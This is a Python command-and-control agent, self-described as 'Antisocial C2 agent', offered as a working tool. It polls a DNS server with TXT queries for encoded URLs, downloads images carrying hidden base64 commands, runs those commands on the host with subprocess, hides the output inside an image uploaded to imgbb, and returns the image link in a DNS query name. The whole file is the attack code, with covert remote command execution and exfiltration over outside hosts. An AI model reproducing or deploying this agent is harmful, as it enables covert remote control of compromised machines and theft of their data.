#!/usr/bin/python3

import time
import httpx
import asyncio
import subprocess
import socket
import shlex
from dnslib import *
from base64 import *
import argparse


def create_image():
	with httpx.Client(verify=False) as client:
		r = client.get(url='https://i.ibb.co/hJ7nzXfn/fuck.jpg')
		img_bytes = r.content.split(r"\x43\123\34x\23\x123\x666".encode())[0]
		return img_bytes

async def upload_image(output):
	async with httpx.AsyncClient(verify=False) as client:
			url = 'https://imgbb.com/json'
			file = {'source': ('fuck.png', output)}
			data = {
				'type': 'file',
				'action': 'upload',
				'timestamp': str(int(time.time() * 1000)),
				'auth_token': <your imgbb api token>
			}
			r = await client.post(url=url, files=file, data=data)
			img_json = r.json()
			img_url = img_json['image']['url']
			return img_url

def check(server, port):
    request = DNSRecord.question("check.hello.com", qtype="TXT")
    s.sendto(request.pack(), (server,port))
    data, addr = s.recvfrom(512)
    reply = DNSRecord.parse(data)
    url = None
    for rr in reply.rr:
        url = shlex.split(str(rr.rdata).replace('"', ''))
    return url

def main(s, server, port):
    while True:
        result = check(server, port)
        if result is None:
            time.sleep(2)
            continue
        else:
            url = b64decode(result[0]).decode()
            with httpx.Client(verify=False) as client:
                r = client.get(url=url)
                cmd = r.content.split(r"\x43\123\34x\23\x123\x666".encode())[1]
                dec_cmd = b64decode(cmd)
                output = subprocess.getoutput(dec_cmd)
                img_bytes = create_image()  
                decilimiter = r"\x43\123\34x\23\x123\x666".encode()
                half = len(img_bytes) // 2
                output_bytes = b64encode(output.encode())
                final_bytes = img_bytes + decilimiter + output_bytes
                img_url = asyncio.run(upload_image(final_bytes))
                #get_url(b64encode(img_url.encode()).decode())
                r = DNSRecord.question(f"{b64encode(img_url.encode()).decode()}.hello.com", qtype="TXT")
                s.sendto(r.pack(), (server, port))

parser = argparse.ArgumentParser(description="Antisocial C2 agent")
parser.add_argument("--server", required=True, help="DNS server IP")
parser.add_argument("--port", type=int, default=53, help="DNS server port")
args = parser.parse_args()

server = args.server
port = args.port
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

main(s, server, port)
